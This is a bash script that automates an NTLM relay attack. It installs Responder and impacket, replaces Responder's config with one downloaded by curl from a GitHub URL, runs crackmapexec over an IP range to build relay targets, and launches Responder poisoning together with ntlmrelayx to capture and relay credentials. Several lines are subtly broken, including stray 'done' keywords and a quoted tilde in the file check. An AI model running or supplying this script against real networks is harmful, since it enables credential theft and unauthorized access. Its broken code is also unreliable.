#!/bin/bash

#Installing dependencies if not already installed
echo "[+] Checking for application dependencies."
if command -v terminator &> /dev/null
then
    echo "[+] Terminator is installed."
else
echo "[+] Installing Terminator."
sudo apt update && sudo apt install terminator -y
fi
if command -v responder &> /dev/null
then
    echo "[+] Responder is installed."
else
echo "[+] Installing Responder."
sudo apt update && sudo apt install responder -y
fi
if command -v impacket-scripts &> /dev/null
then
    echo "[+] Impacket-Scripts is installed."
else
echo "[+] Installing Impacket-Scrpits."
sudo apt update && sudo apt install impacket-scripts -y
fi
done

#Options
while getopts 'r:h' opt; do
  case "$opt" in
    r)
      range="$OPTARG"
      echo -e "[+] IP Range is set to '$range'"
      ;;

    h)
      echo -e "[!] Usage: $(basename $0) -r 10.10.10.0/24"
      echo -e "              -h:  print this help dialog"
      echo -e "              -r:  specify IP Range (Required)"
      exit 0
      ;;

    :)
      echo -e "[!] Option requires an argument.\n\n    For usage, use $(basename $0) -h"
      exit 1
      ;;

    ?)
      echo -e "[!]] For usage, use $(basename $0) -h"
      exit 1
      ;;
  esac
done

#Removing original Responder Config File
sudo rm -rf /usr/share/responder/Responder.conf

#Downloading Modified Responder Config File
sudo curl https://raw.githubusercontent.com/B0rk/Scripts/main/Responder_Config/ntlmrelayx_responder.conf -o /usr/share/responder/Responder.conf

#Sleep to allow for removal and downloading to complete.
sleep 10

#Running CrackMapExec to create a relay list
crackmapexec smb ${range} --gen-relay-list ~/relay_targets.txt

#Launching Responder and impacket-ntlmrelayx
if [ ! -f "~/relay_targets.txt" ]; then
    echo "Relay file does not exist. Sorry about your luck..."
else
    terminator -e "sudo responder -I eth0 -w"
    terminator -e "impacket-ntlmrelayx -tf ~/relay_targets.txt -smb2support -socks --output-file ~/ntlmrelayx_hashes.out"
fi
done
exit
